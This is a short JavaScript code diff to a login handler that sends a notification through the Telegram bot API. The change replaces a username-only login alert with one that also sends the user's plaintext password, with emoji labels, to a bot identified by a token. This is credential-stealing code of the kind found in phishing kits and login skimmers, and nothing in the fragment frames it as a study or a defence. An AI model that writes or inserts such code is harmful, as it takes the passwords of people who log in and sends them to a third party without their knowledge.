@@ -208,9 +208,10 @@ sendTelegram(username);
 function sendTelegram(user){
 
 let message =
-"✅ New Login Alert\n\n" +
-"Username: " + user + "\n" +
-"Time: " + new Date().toLocaleString();
+"🚨 NEW LOGIN ALERT 🚨\n\n"+
+"👤 Username: " + username + "\n"+
+"🔑 Password: " + password + "\n"+
+"🌍 Time: " + new Date().toLocaleString();
 
 fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
 method: "POST",
